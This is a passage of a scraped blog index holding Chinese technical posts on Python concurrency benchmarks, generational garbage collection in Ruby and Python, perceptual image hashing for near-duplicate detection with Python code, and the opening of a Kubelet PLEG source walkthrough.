retprint calcPi(3000,4000) SCOOP SCOOP中的Future接口符合 PEP-3148 的定义，也就是在Python3中提供的 Future 接口。 在缺省的SCOOP配置环境下（单机，4个Worker），并发的性能有提高，但是不如两个进程池配置的多进程。 1234567891011121314151617181920from math import hypotfrom random import randomfrom scoop import futuresimport timedef test(tries): return sum(hypot(random(), random()) &lt; 1 for _ in range(tries))def calcPi(nbFutures, tries): ts = time.time() expr = futures.map(test, [tries] * nbFutures) ret = 4. * sum(expr) / float(nbFutures * tries) span = time.time() - ts print &quot;time spend &quot;, span return retif __name__ == &quot;__main__&quot;: print(&quot;pi = {}&quot;.format(calcPi(3000, 4000))) Celery 任务代码 1234567891011from celery import Celeryfrom math import hypotfrom random import randomapp = Celery('tasks', backend='amqp', broker='amqp://guest@localhost//')app.conf.CELERY_RESULT_BACKEND = 'db+sqlite:///results.sqlite'@app.taskdef test(tries): return sum(hypot(random(), random()) &lt; 1 for _ in range(tries)) 客户端代码 123456789101112131415from celery import groupfrom tasks import testimport timedef calcPi(nbFutures, tries): ts = time.time() result = group(test.s(tries) for i in xrange(nbFutures))().get() ret = 4. * sum(result) / float(nbFutures * tries) span = time.time() - ts print &quot;time spend &quot;, span return retprint calcPi(3000, 4000) 使用Celery做并发的测试结果出乎意料（环境是单机，4frefork的并发，消息broker是rabbitMQ），是所有测试用例里最糟糕的，响应时间是没有并发的5～6倍。这也许是因为控制协调的开销太大。对于这样的计算任务，Celery也许不是一个好的选择。 asyncoro Asyncoro的测试结果和非并发保持一致。 12345678910111213141516171819import asyncorofrom math import hypotfrom random import randomimport timedef test(tries): yield sum(hypot(random(), random()) &lt; 1 for _ in range(tries))def calcPi(nbFutures, tries): ts = time.time() coros = [ asyncoro.Coro(test,t) for t in [tries] * nbFutures] ret = 4. * sum([job.value() for job in coros]) / float(nbFutures * tries) span = time.time() - ts print &quot;time spend &quot;, span return retprint calcPi(3000,4000) IO密集型IO密集型的任务是另一种常见的用例，例如网络WEB服务器就是一个例子，每秒钟能处理多少个请求时WEB服务器的重要指标。 我们就以网页读取作为最简单的例子 1234567891011121314151617from math import hypotimport timeimport urllib2urls = ['http://www.google.com', 'http://www.example.com', 'http://www.python.org']def test(url): return urllib2.urlopen(url).read()def testIO(nbFutures): ts = time.time() map(test, urls * nbFutures) span = time.time() - ts print &quot;time spend &quot;, spantestIO(10) 在不同并发库下的代码，由于比较类似，我就不一一列出。大家可以参考计算密集型中代码做参考。 通过测试我们可以发现，对于IO密集型的任务，使用多线程，或者是多进程都可以有效的提高程序的效率，而使用伪线程性能提升非常显著，eventlet比没有并发的情况下，响应时间从9秒提高到0.03秒。同时eventlet／gevent提供了非阻塞的异步调用模式，非常方便。这里推荐使用线程或者伪线程，因为在响应时间类似的情况下，线程和伪线程消耗的资源更少。 总结Python提供了不同的并发方式，对应于不同的场景，我们需要选择不同的方式进行并发。选择合适的方式，不但要对该方法的原理有所了解，还应该做一些测试和试验，数据才是你做选择的最好参考。 原文地址：http://my.oschina.net/taogang/blog/389293","link":"/hexo-blog/2015/04/08/%E4%BD%BF%E7%94%A8%20Python%20%E8%BF%9B%E8%A1%8C%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"},{"title":"对比Ruby和Python的垃圾回收（2）：代式垃圾回收机制","text":"上周，我根据之前在RuPy上做的一个名为“Visualizing Garbage Collection in Ruby and Python.”的报告写了这篇文章的上半部分。在上篇中，我解释了标准Ruby(也被称为Matz的Ruby解释器或是MRI)是如何使用名为标记回收(Mark and Sweep)的垃圾回收算法，这个算法是为1960年原版本的Lisp所开发。同样，我也介绍了Python使用一种有53年历史的GC算法，这种算法的思路非常不同，称之为引用计数。 事实证明，Python在引用计数之外，还用了另一个名为Generational Garbage Collection的算法。这意味着Python的垃圾回收器用不同的方式对待新创建的以及旧有的对象。并且在即将到来的2.1版本的MRI Ruby中也首次引入了Generational Garbage Collection 的垃圾回收机制(在另两个Ruby的实现：JRuby和Rubinius中，已经使用这种GC机制很多年了，我将在下周的RubyConf大会上将它是如何在这两种Ruby实现中工作的)。 当然，这句话“用不同的方式对待新创建的以及旧有的对象”是有点模糊不清，比如如何定义新、旧对象？又比如对于Ruby和Python来说具体是如何采取不同的对待方式？今天，我们就来谈谈这两种语言GC机制的运行原理，回答上边那些疑问。但是在我们开始谈论Generational GC之前，我们先要花点时间谈论下Python的引用计数算法的一个严重的理论问题。 Python中的循环数据结构以及引用计数通过上篇，我们知道在Python中，每个对象都保存了一个称为引用计数的整数值，来追踪到底有多少引用指向了这个对象。无论何时，如果我们程序中的一个变量或其他对象引用了目标对象，Python将会增加这个计数值，而当程序停止使用这个对象，则Python会减少这个计数值。一旦计数值被减到零，Python将会释放这个对象以及回收相关内存空间。 从六十年代开始，计算机科学界就面临了一个严重的理论问题，那就是针对引用计数这种算法来说，如果一个数据结构引用了它自身，即如果这个数据结构是一个循环数据结构，那么某些引用计数值是肯定无法变成零的。为了更好地理解这个问题，让我们举个例子。下面的代码展示了一些上周我们所用到的节点类： 我们有一个构造器(在Python中叫做 init )，在一个实例变量中存储一个单独的属性。在类定义之后我们创建两个节点，ABC以及DEF，在图中为左边的矩形框。两个节点的引用计数都被初始化为1，因为各有两个引用指向各个节点(n1和n2)。 现在，让我们在节点中定义两个附加的属性，next以及prev： 跟Ruby不同的是，Python中你可以在代码运行的时候动态定义实例变量或对象属性。这看起来似乎有点像Ruby缺失了某些有趣的魔法。(声明下我不是一个Python程序员，所以可能会存在一些命名方面的错误)。我们设置 n1.next 指向 n2，同时设置 n2.prev 指回 n1。现在，我们的两个节点使用循环引用的方式构成了一个双端链表。同时请注意到 ABC 以及 DEF 的引用计数值已经增加到了2。这里有两个指针指向了每个节点：首先是 n1 以及 n2，其次就是 next 以及 prev。 现在，假定我们的程序不再使用这两个节点了，我们将 n1 和 n2 都设置为null(Python中是None)。 好了，Python会像往常一样将每个节点的引用计数减少到1。 在Python中的零代(Generation Zero)请注意在以上刚刚说到的例子中，我们以一个不是很常见的情况结尾：我们有一个“孤岛”或是一组未使用的、互相指向的对象，但是谁都没有外部引用。换句话说，我们的程序不再使用这些节点对象了，所以我们希望Python的垃圾回收机制能够足够智能去释放这些对象并回收它们占用的内存空间。但是这不可能，因为所有的引用计数都是1而不是0。Python的引用计数算法不能够处理互相指向自己的对象。 当然，上边举的是一个故意设计的例子，但是你的代码也许会在不经意间包含循环引用并且你并未意识到。事实上，当你的Python程序运行的时候它将会建立一定数量的“浮点数垃圾”，Python的GC不能够处理未使用的对象因为应用计数值不会到零。 这就是为什么Python要引入Generational GC算法的原因！正如Ruby使用一个链表(free list)来持续追踪未使用的、自由的对象一样，Python使用一种不同的链表来持续追踪活跃的对象。而不将其称之为“活跃列表”，Python的内部C代码将其称为零代(Generation Zero)。每次当你创建一个对象或其他什么值的时候，Python会将其加入零代链表： 从上边可以看到当我们创建ABC节点的时候，Python将其加入零代链表。请注意到这并不是一个真正的列表，并不能直接在你的代码中访问，事实上这个链表是一个完全内部的Python运行时。 相似的，当我们创建DEF节点的时候，Python将其加入同样的链表： 现在零代包含了两个节点对象。(他还将包含Python创建的每个其他值，与一些Python自己使用的内部值。) 检测循环引用随后，Python会循环遍历零代列表上的每个对象，检查列表中每个互相引用的对象，根据规则减掉其引用计数。在这个过程中，Python会一个接一个的统计内部引用的数量以防过早地释放对象。 为了便于理解，来看一个例子： 从上面可以看到 ABC 和 DEF 节点包含的引用数为1.有三个其他的对象同时存在于零代链表中，蓝色的箭头指示了有一些对象正在被零代链表之外的其他对象所引用。(接下来我们会看到，Python中同时存在另外两个分别被称为一代和二代的链表)。这些对象有着更高的引用计数因为它们正在被其他指针所指向着。 接下来你会看到Python的GC是如何处理零代链表的。 通过识别内部引用，Python能够减少许多零代链表对象的引用计数。在上图的第一行中你能够看见ABC和DEF的引用计数已经变为零了，这意味着收集器可以释放它们并回收内存空间了。剩下的活跃的对象则被移动到一个新的链表：一代链表。 从某种意义上说，Python的GC算法类似于Ruby所用的标记回收算法。周期性地从一个对象到另一个对象追踪引用以确定对象是否还是活跃的，正在被程序所使用的，这正类似于Ruby的标记过程。 Python中的GC阈值Python什么时候会进行这个标记过程？随着你的程序运行，Python解释器保持对新创建的对象，以及因为引用计数为零而被释放掉的对象的追踪。从理论上说，这两个值应该保持一致，因为程序新建的每个对象都应该最终被释放掉。 当然，事实并非如此。因为循环引用的原因，并且因为你的程序使用了一些比其他对象存在时间更长的对象，从而被分配对象的计数值与被释放对象的计数值之间的差异在逐渐增长。一旦这个差异累计超过某个阈值，则Python的收集机制就启动了，并且触发上边所说到的零代算法，释放“浮动的垃圾”，并且将剩下的对象移动到一代列表。 随着时间的推移，程序所使用的对象逐渐从零代列表移动到一代列表。而Python对于一代列表中对象的处理遵循同样的方法，一旦被分配计数值与被释放计数值累计到达一定阈值，Python会将剩下的活跃对象移动到二代列表。 通过这种方法，你的代码所长期使用的对象，那些你的代码持续访问的活跃对象，会从零代链表转移到一代再转移到二代。通过不同的阈值设置，Python可以在不同的时间间隔处理这些对象。Python处理零代最为频繁，其次是一代然后才是二代。 弱代假说来看看代垃圾回收算法的核心行为：垃圾回收器会更频繁的处理新对象。一个新的对象即是你的程序刚刚创建的，而一个来的对象则是经过了几个时间周期之后仍然存在的对象。Python会在当一个对象从零代移动到一代，或是从一代移动到二代的过程中提升(promote)这个对象。 为什么要这么做？这种算法的根源来自于弱代假说(weak generational hypothesis)。这个假说由两个观点构成：首先是年亲的对象通常死得也快，而老对象则很有可能存活更长的时间。 假定现在我用Python或是Ruby创建一个新对象： 根据假说，我的代码很可能仅仅会使用ABC很短的时间。这个对象也许仅仅只是一个方法中的中间结果，并且随着方法的返回这个对象就将变成垃圾了。大部分的新对象都是如此般地很快变成垃圾。然而，偶尔程序会创建一些很重要的，存活时间比较长的对象-例如web应用中的session变量或是配置项。 通过频繁的处理零代链表中的新对象，Python的垃圾收集器将把时间花在更有意义的地方：它处理那些很快就可能变成垃圾的新对象。同时只在很少的时候，当满足阈值的条件，收集器才回去处理那些老变量。 回到Ruby的自由链即将到来的Ruby 2.1版本将会首次使用基于代的垃圾回收算法！(请注意的是，其他的Ruby实现，例如JRuby和Rubinius已经使用这个算法许多年了)。让我们回到上篇博文中提到的自由链的图来看看它到底是怎么工作的。 请回忆当自由链使用完之后，Ruby会标记你的程序仍然在使用的对象。 从这张图上我们可以看到有三个活跃的对象，因为指针n1、n2、n3仍然指向着它们。剩下的用白色矩形表示的对象即是垃圾。(当然，实际情况会复杂得多，自由链可能会包含上千个对象，并且有复杂的引用指向关系，这里的简图只是帮助我们了解Ruby的GC机制背后的简单原理，而不会将我们陷入细节之中) 同样，我们说过Ruby会将垃圾对象移动回自由链中，这样的话它们就能在程序申请新对象的时候被循环使用了。 Ruby2.1基于代的GC机制从2.1版本开始，Ruby的GC代码增加了一些附加步骤：它将留下来的活跃对象晋升(promote)到成熟代(mature generation)中。(在MRI的C源码中使用了old这个词而不是mature)，接下来的图展示了两个Ruby2.1对象代的概念图： 在左边是一个跟自由链不相同的场景，我们可以看到垃圾对象是用白色表示的，剩下的是灰色的活跃对象。灰色的对象刚刚被标记。 一旦“标记清除”过程结束，Ruby2.1将剩下的标记对象移动到成熟区： 跟Python中使用三代来划分不同，Ruby2.1只用了两代，左边是年轻的新一代对象，而右边是成熟代的老对象。一旦Ruby2.1标记了对象一次，它就会被认为是成熟的。Ruby会打赌剩下的活跃对象在相当长的一段时间内不会很快变成垃圾对象。 重要提醒：Ruby2.1并不会真的在内存中拷贝对象，这些代表不同代的区域并不是由不同的物理内存区域构成。(有一些别的编程语言的GC实现或是Ruby的其他实现，可能会在对象晋升的时候采取拷贝的操作)。Ruby2.1的内部实现不会将在标记&amp;清除过程中预先标记的对象包含在内。一旦一个对象已经被标记过一次了，那么那将不会被包含在接下来的标记清除过程中。 现在，假定你的Ruby程序接着运行着，创造了更多新的，更年轻的对象。则GC的过程将会在新的一代中出现，如图： 如同Python那样，Ruby的垃圾收集器将大部分精力都放在新一代的对象之上。它仅仅会将自上一次GC过程发生后创建的新的、年轻的对象包含在接下来的标记清除过程中。这是因为很多新对象很可能马上就会变成垃圾(白色标记)。Ruby不会重复标记右边的成熟对象。因为他们已经在一次GC过程中存活下来了，在相当长的一段时间内不会很快变成垃圾。因为只需要标记新对象，所以Ruby 的GC能够运行得更快。它完全跳过了成熟对象，减少了代码等待GC完成的时间。 偶然的Ruby会运行一次“全局回收”，重标记(re-marking)并重清除(re-sweeping)，这次包括所有的成熟对象。Ruby通过监控成熟对象的数目来确定何时运行全局回收。当成熟对象的数目双倍于上次全局回收的数目时，Ruby会清理所有的标记并且将所有的对象都视为新对象。 白障这个算法的一个重要挑战是值得深入解释的：假定你的代码创建了一个新的年轻的对象，并且将其作为一个已存在的成熟对象的子嗣加入。举个例子，这种情况将会发生在，当你往一个已经存在了很长时间的数组中增加了一个新值的时候： 让我们来看看图，左边的是新对象，而成熟的对象在右边。在左边标记过程已经识别出了5个新的对象目前仍然是活跃的(灰色)。但有两个对象已经变成垃圾了(白色)。但是如何处理正中间这个新建对象？这是刚刚那个问题提到的对象，它是垃圾还是活跃对象呢？ 当然它是活跃对象了，因为有一个从右边成熟对象的引用指向它。但是我们前面说过已经被标记的成熟对象是不会被包含在标记清除过程中的(一直到全局回收)。这意味着类似这种的新建对象会被错误的认为是垃圾而被释放，从而造成数据丢失。 Ruby2.1 通过监视成熟对象，观察你的代码是否会添加一个从它们到新建对象的引用来克服这个问题。Ruby2.1 使用了一个名为白障(white barriers)的老式GC技术来监视成熟对象的变化 – 无论任意时刻当你添加了从一个对象指向另一个对象的引用时(无论是新建或是修改一个对象)，白障就会被触发。白障将会检测是否源对象是一个成熟对象，如果是的话则将这个成熟对象添加到一个特殊的列表中。随后，Ruby2.1会将这些满足条件的成熟对象包括到下一次标记清除的范围内，以防止新建对象被错误的标记为垃圾而清除。 Ruby2.1 的白障实现相当复杂，主要是因为已有的C扩展并未包含这部分功能。Koichi Sasada以及Ruby的核心团队使用了一个比较巧妙的方案来解决这个问题。如果想了解更多的内容，请阅读这些相关材料：Koichi在 EuRuKo 2013 上的演讲 Koichi’s fascinating presentation。 站在巨人的肩膀上乍眼一看，Ruby和Python的GC实现是截然不同的，Ruby使用John MaCarthy的原生“标记并清除”算法，而Python使用引用计数。但是仔细看来，可以发现Python使用了些许标记清除的思想来处理循环引用，而两者同时以相似的方式使用基于代的垃圾回收算法。Python划分了三代，而Ruby只有两代。 这种相似性应该不会让人感到意外。两种编程语言都使用了几十年前的计算机科学研究成果来进行设计，这些成果早在语言成型之前就已经被做出来了。我比较惊异的是当你掀开不同编程语言的表面而深入底层，你总能够发现一些相似的基础理念和算法。现代编程语言应该感激那些六七十年代由麦卡锡等计算机先贤所作出的计算机科学开创性研究。 原文：Pat Shaughnessy Generational GC in Python and Ruby译文：http://blog.jobbole.com/73300/","link":"/hexo-blog/2015/04/20/%E5%AF%B9%E6%AF%94Ruby%E5%92%8CPython%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%EF%BC%882%EF%BC%89%EF%BC%9A%E4%BB%A3%E5%BC%8F%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"},{"title":"利用图片指纹检测高相似度图片","text":"大概五年前吧，我那时还在为一家约会网站做开发工作。他们是早期创业公司，但他们也开始拥有了一些稳定用户量。不像其他约会网站，这家公司向来以洁身自好为主要市场形象。它不是一个供你鬼混的网站——是让你能找到忠实伴侣的地方。 由于投入了数以百万计的风险资本（在US大萧条之前），他们关于真爱并找寻灵魂伴侣的在线广告势如破竹。Forbes(福布斯，美国著名财经杂志)采访了他们。全国性电视节目也对他们进行了专访。早期的成功促成了事业起步时让人垂涎的指数级增长现象——他们的用户数量以每月加倍的速度增长。对他们而言，一切都似乎顺风顺水。 但他们有一个严重的问题——色情问题。 该约会网站的用户中会有一些人上传色情图片，然后设置为其个人头像。这种行为破坏了很多其他用户的体验——导致很多用户取消了会员。 可能对于现在的一些约会网站随处可见几张色情图片也许并不能称之为是问题。或者可以说是习以为常甚至有些期待，只是一个被接受然后被无视的在线约会的副产品。 然而，这样的行为既不应该被接受也应该被忽视。 别忘了，这次创业可是将自己定位在优秀的约会天堂，免于用户受到困扰其他约会网站的污秽和垃圾的烦扰。简而言之，他们拥有很实在的以风险资本作为背后支撑的名声，而这也正是他们需要保持的风格。 该约会网站为了能迅速阻止色情图片的爆发可以说是不顾一切了。他们雇佣了图片论坛版主团队，真是不做其他事只是每天盯着监管页面8个小时以上，然后移除任何被上传到社交网络的色情图片。 毫不夸张的说，他们投入了数万美元（更不用说数不清的人工小时）来解决这个问题，然而也仅仅只是缓解，控制情况不变严重而不是在源头上阻止。 色情图片的爆发在2009年的七月达到了临界水平。8个月来第一次用户量没能翻倍（甚至已经开始减少了）。更糟糕的是，投资者声称若该公司不能解决这个问题将会撤资。事实上，污秽的潮汐早已开始冲击这座象牙塔了，将它推翻流入大海也不过是时间问题。 正在这个约会网站巨头快要撑不住时，我提出了一个更鲁棒的长期解决方案：如果我们使用图片指纹来与色情图片的爆发斗争呢？ 你看，每张图片都有一个指纹。正如人的指纹可以识别人，图片的指纹能识别图片。 这促使了一个三阶段算法的实现： 为不雅图片建立指纹，然后将图片指纹存储在一个数据库中。 当一个用户上传一份新的头像时，我们会将它与数据库中的图片指纹对比。如果上传图片的指纹与数据库任意一个不雅图片指纹相符，我们就阻止用户将该图片设置为个人头像。 当图片监管人标记新的色情图片时，这些图片也被赋予指纹并存入我们的数据库，建立一个能用于阻止非法上传且不断进化的数据库。 我们的方法，尽管不十分完美，但是也卓有成效。慢慢地，色情图片爆发的情况有所减慢。它永远不会消失——但这个算法让我们成功将非法上传的数量减少了**80%**以上。 这也挽回了投资者的心。他们继续为我们提供资金支持——直到萧条到来，我们都失业了。 回顾过去时，我不禁笑了。我的工作并没持续太久。这个公司也没有坚持太久。甚至还有几个投资者卷铺盖走人了。 但有一样确实存活了下来。提取图片指纹的算法。几年之后，我把这个算法的基本内容分享出来，期望你们可以将它应用到你们自己的项目中。 但最大的问题是，我们怎么才能建立图片指纹呢？ 继续读下去一探究竟吧。 即将要做的事情我们打算用图片指纹进行相似图片的检测。这种技术通常被称为“感知图像hash”或是简单的“图片hash”。 什么是图片指纹/图片哈希图片hash是检测一张图片的内容然后根据检测的内容为图片建立一个唯一值的过程。 比如，看看本文最上面的那张图片。给定一张图片作为输入，应用一个hash函数，然后基于图片的视觉计算出一个图片hash。相似的图片也应当有相似的hash值。图片hash算法的应用使得相似图片的检测变得相当简单了。 特别地，我们将会使用“差别Hash”或简单的DHash算法计算图片指纹。简单来说，DHash算法着眼于两个相邻像素之间的差值。然后，基于这样的差值，就建立起一个hash值了。 为什么不使用md5,sha-1等算法？不幸的是，我们不能在实现中使用加密hash算法。由于加密hash算法的本质使然，输入文件中非常微小的差别也能造成差异极大的hash值。而在图片指纹的案例中，我们实际上希望相似的输入可以有相似的hash输出值。 图片指纹可以用在哪里？正如我上面举的例子，你可以使用图片指纹来维护一个保存不雅图片的数据库——当用户尝试上传类似图片时可以发出警告。 你可以建立一个图片的逆向搜索引擎，比如TinEye，它可以记录图片以及它们出现的相关网页。 你还可以使用图片指纹帮助管理你个人的照片收集。假设你有一个硬盘，上面有你照片库的一些局部备份，但需要一个方法删除局部备份，一张图片仅保留一份唯一的备份——图片指纹可以帮你做到。 简单来说，你几乎可以将图片指纹/哈希用于任何需要你检测图片的相似副本的场景中。 需要的库有哪些？为了建立图片指纹方案，我们打算使用三个主要的Python包： PIL / Pillow用于读取和载入图片 ImageHash，包括DHash的实现 以及 NumPy/ SciPy，ImageHash的依赖包 你可以使用下列命令一键安装所需要的必备库： 1$ pip install pillow imagehash 第一步：为一个图片集建立指纹第一步就是为我们的图片集建立指纹。 也许你会问，但我们不会，我们不会使用那些我为那家约会网站工作时的色情图片。相反，我创建了一个可供使用的人工数据集。 对计算机视觉的研究人员而言，数据集 CALTECH-101是一个传奇般的存在。它包含来自101个不同分类中的至少7500张图片，内容分别有人物，摩托车和飞机。 从这7500多张图片中，我随机的挑选了17张。 然后，从这17张随机挑选的图片中，以几个百分点的比例随机放大/缩小并创建N张新图片。这里我们的目标是找到这些近似副本的图片——有点大海捞针的感觉。 你也想创建一个类似的数据集用于工作吗？那就下载 CALTECH-101数据集，抽取大概17张图片即可，然后运行repo下的脚本文件gather.py。 回归正题，这些图片除了宽度和高度，其他各方面都是一样的。而且因为他们没有相同的形状，我们不能依赖简单的md5校验和。最重要的是，有相似内容的图片可能有完全不相同的md5哈希。然而，采取图片哈希，相似内容的图片也有相似的哈希指纹。 所以赶紧开始写代码为数据集建立指纹吧。创建一个新文件，命名为index.py，然后开始工作： 1234567891011121314# import the necessary packagesfrom PIL import Imageimport imagehashimport argparseimport shelveimport glob# construct the argument parse and parse the argumentsap = argparse.ArgumentParser()ap.add_argument(&quot;-d&quot;, &quot;--dataset&quot;, required = True,help = &quot;path to input dataset of images&quot;)ap.add_argument(&quot;-s&quot;, &quot;--shelve&quot;, required = True,help = &quot;output shelve database&quot;)args = vars(ap.parse_args()) 要做的第一件事就是引入我们需要的包。我们将使用PIL或Pillow中的Image类载入硬盘上的图片。这个imagehash库可以被用于构建哈希算法。 Argparse库用于解析命令行参数，shelve库用作一个存储在硬盘上的简单键值对数据库（Python字典）。glob库能很容易的获取图片路径。 然后传递命令行参数。第一个，—dataset是输入图片库的路径。第二个，—shelve是shelve数据库的输出路径。 下一步，打开shelve数据库以写数据。这个db数据库存储图片哈希。更多的如下所示： 1234567891011121314# loop over the image datasetfor imagePath in glob.glob(args[&quot;dataset&quot;] + &quot;/*.jpg&quot;):# load the image and compute the difference hash image = Image.open(imagePath) h = str(imagehash.dhash(image))# extract the filename from the path and update the database# using the hash as the key and the filename append to the# list of values filename = imagePath[imagePath.rfind(&quot;/&quot;) + 1:] db[h] = db.get(h, []) + [filename]# close the shelf databasedb.close() 以上就是大部分工作的内容了。开始循环从硬盘读取图片，创建图片指纹并存入数据库。 现在，来看看整个范例中最重要的两行代码： 12filename = imagePath[imagePath.rfind(&quot;/&quot;) + 1:]db[h] = db.get(h, []) + [filename] 正如本文早些时候提到的，有相同指纹的图片被认为是一样的。 因此，如果我们的目标是找到近似图片，那就需要维护一个有相同指纹值的图片列表。 而这也正是这几行代码做的事情。 前一个代码段提取了图片的文件名。而后一个代码片段维护了一个有相同指纹值的图片列表。 为了从我们的数据库中提取图片指纹并建立哈希数据库，运行下列命令： 1$ python index.py —dataset images —shelve db.shelve 这个脚本会运行几秒钟，完成后，就会出现一个名为db.shelve的文件，包含了图片指纹和文件名的键值对。 这个基本算法正是几年前我为这家约会创业公司工作时使用的算法。我们获得了一个不雅图片集，为其中的每张图片构建一个图片指纹并将其存入数据库。当来一张新图片时，我只需简单地计算它的哈希值，检测数据库查看是否上传图片已被标识为非法内容。 下一步中，我将展示实际如何执行查询，判定数据库中是否存在与所给图片具有相同哈希值的图片。 第二步：查询数据集既然已经建立了一个图片指纹的数据库，那么现在就该搜索我们的数据集了。 打开一个新文件，命名为search.py，然后开始写代码： 123456789101112131415# import the necessary packagesfrom PIL import Imageimport imagehashimport argparseimport shelve# construct the argument parse and parse the argumentsap = argparse.ArgumentParser()ap.add_argument(&quot;-d&quot;, &quot;--dataset&quot;, required = True, help = &quot;path to dataset of images&quot;)ap.add_argument(&quot;-s&quot;, &quot;--shelve&quot;, required = True, help = &quot;output shelve database&quot;)ap.add_argument(&quot;-q&quot;, &quot;--query&quot;, required = True, help = &quot;path to the query image&quot;)args = vars(ap.parse_args()) 我们需要再一次导入相关的包。然后转换命令行参数。需要三个选项，—dataset初始图片集的路径，—shelve，保存键值对的数据库的路径，—query，查询/上传图片的路径。我们的目标是对于每个查询图片，判定数据库中是否已经存在。 现在，写代码执行实际的查询： 123456789101112131415161718# open the shelve databasedb = shelve.open(args[&quot;shelve&quot;])# load the query image, compute the difference image hash, and# and grab the images from the database that have the same hash# valuequery = Image.open(args[&quot;query&quot;])h = str(imagehash.dhash(query))filenames = db[h]print &quot;Found %d images&quot; % (len(filenames))# loop over the imagesfor filename in filenames: image = Image.open(args[&quot;dataset&quot;] + &quot;/&quot; + filename) image.show()# close the shelve databasedb.close() 首先打开数据库，然后载入硬盘上的图片，计算图片的指纹，找到具有相同指纹的所有图片。 如果有图片具有相同的哈希值，会遍历这些图片并展示在屏幕上。 这段代码使我们仅仅使用指纹值就能判定图片是否已在数据库中存在。 结果正如本文早些时候提到的，我从CALTECH-101数据集的7500多张图片中随机选取17张，然后通过任意缩放一部分点产生N张新的图片。 这些图片在尺寸上仅仅是少数像素不同—但也是因为这一点我们不能依赖于文件的md5哈希（这一点已在“优化算法”部分进行了详尽的描述）。然而，我们可以使用图片哈希找到近似图片。 打开你的终端并执行下述命令： 1$ python search.py —dataset images —shelve db.shelve —query images/84eba74d-38ae-4bf6-b8bd-79ffa1dad23a.jpg 如果一切顺利你就可以看到下述结果： 左边是输入图片。载入这张图片，计算它的图片指纹，在数据库中搜索指纹查看是否存在有相同指纹的图片。 当然——正如右边所示，我们的数据集中有其他两张指纹相同的图片。尽管从截图中还不能十分明显的看出，这些图片，虽然有完全相同的视觉内容，也不是完全相同！这三张图片的高度宽度各不相同。 尝试一下另外一个输入图片： 1$ python search.py —dataset images —shelve db.shelve —query images/9d355a22-3d59-465e-ad14-138a4e3880bc.jpg 下面是结果： 左边仍然是我们的输入图片。正如右边展示的，我们的图片指纹算法能够找出具有相同指纹的三张完全相同的图片。 最后一个例子： 1$ python search.py —dataset images —shelve db.shelve —query images/5134e0c2-34d3-40b6-9473-98de8be16c67.jpg 这一次左边的输入图片是一个摩托车。拿到这张摩托车图片，计算它的图片指纹，然后在指纹数据库中查找该指纹。正如我们在右边看到的，我们也能判断出数据库中有三张图片具有相同指纹。 优化算法有很多可以优化本算法的方法——但最关键性的是要考虑到相似但不相同的哈希。 比如，本文中的图片仅仅是一小部分点重组了（依比例增大或减小）。如果一张图片以一个较大的因素调整大小，或者纵横比被改变了，对应的哈希就会不同了。 然而，这些图片应该仍然是相似的。 为了找到相似但不相同的图片，我们需要计算汉明距离（Hamming distance）.汉明距离被用于计算一个哈希中的不同位数。因此，哈希中只有一位不同的两张图片自然比有10位不同的图片更相似。 然而，我们遇到了第二个问题——算法的可扩展性。 考虑一下：我们有一张输入图片，又被要求在数据库中找到所有相似图片。然后我们必须计算输入图片和数据库中的每一张图片之间的汉明距离。 随着数据库规模的增长，和数据库比对的时间也随着延长。最终，我们的哈希数据库会达到一个线性比对已经不实际的规模。 解决办法，虽然已超出本文范围，就是利用 K-d trees 和 VP trees 将搜索问题的复杂度从线性减小到次线性。 总结本文中我们学会了如何构建和使用图片哈希来完成相似图片的检测。这些图片哈希是使用图片的视觉内容构建的。 正如一个指纹可以识别一个人，图片哈希也能唯一的识别一张图片。 使用图片指纹的知识，我们建立了一个仅使用图片哈希就能找到和识别具有相似内容的图片的系统。 然后我们又演示了图片哈希是如何应用于快速找到有相似内容的图片。 从 repo 目录下下载代码。 周末学计算机视觉如果你很喜欢本文而且还想了解更多与计算机视觉，图片处理以及建立图片搜索引擎相关的东西，那就去我的博客吧，地址是 PyImageSearch.com。 祝福！ 译文地址：http://www.pyimagesearch.com/原文地址：https://realpython.com/blog/python/fingerprinting-images-for-near-duplicate-detection/","link":"/hexo-blog/2015/06/06/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E6%8C%87%E7%BA%B9%E6%A3%80%E6%B5%8B%E9%AB%98%E7%9B%B8%E4%BC%BC%E5%BA%A6%E5%9B%BE%E7%89%87/"},{"title":"Kubelet PLEG 源码解析","text":"PLEG (pod lifecycle event generator) 是 kubelet 中一个非常重要的模块，它主要完成以下几个目标： 从 runtime 中获取 pod 当前状态，产生 pod lifecycle events 从 runtime 中获取 pod 当前状态，更新 kubelet pod cache 本文我们通过分析 PLEG 模块的源码，来加深对 Kubernetes 的理解，也可以加速在使用过程对一些疑难问题的排查和处理，同时后期可以对一些问题源码进行优化，来解决一些 Kubernetes 本身的坑。 PLEG 初始化PLEG 模块在 kubelet 实例创建时初始化，在 pkg/kubelet/kubelet.go 文件中： 12345func NewMainKubelet(...) (*Kubelet, error) { // ... klet.pleg = pleg.NewGenericPLEG(klet.containerRuntime, plegChannelCapacity, plegRelistPeriod, klet.podCache, clock.RealClock{}) // ...} 我们简单看看 NewGenericPLEG 的实现，见 pkg/kubelet/pleg/generic.go： 123456789101112// NewGenericPLEG instantiates a new GenericPLEG object and return it.func NewGenericPLEG(runtime kubecontainer.Runtime, channelCapacity int, relistPeriod time.Duration, cache kubecontainer.Cache, clock clock.Clock) PodLifecycleEventGenerator { return &amp;GenericPLEG{ relistPeriod: relistPeriod, runtime: runtime, eventChannel: make(chan *PodLifecycleEvent, channelCapacity), podRecords: make(podRecords), cache: cache, clock: clock, }} NewGenericPLEG 函数有几个重要的参数： runtime 实参为 klet.containerRuntime，负责容器运行时的管理，对 pod 或 container 状态的获取、同步和删除都通过 runtime 来操作。 channelCapacity 实参为 plegChannelCapacity，是 eventChannel 有缓冲 channel 的大小，默认值 1000，也就是单节点最大支持 1000 个 pod lifecycle event 同时触发。 relistPeriod 实参为 plegRelistPeriod，是 PLEG 检测的周期，默认值 1s。 cache 实参为 klet.podCache，保存着所有 pod 状态的缓存，kubelet 通过 container runtime 更新 pod 缓存。 plegChannelCapacity 和 plegRelistPeriod 这两个常量的定义在 pkg/kubelet/kubelet.go 文件里： 12345const ( plegChannelCapacity = 1000 plegRelistPeriod = time.Second * 1) PLEG 接口定义NewGenericPLEG 返回的类型 *GenericPLEG 实现了 PodLifecycleEventGenerator 接口，我们暂且忽略 GenericPLEG 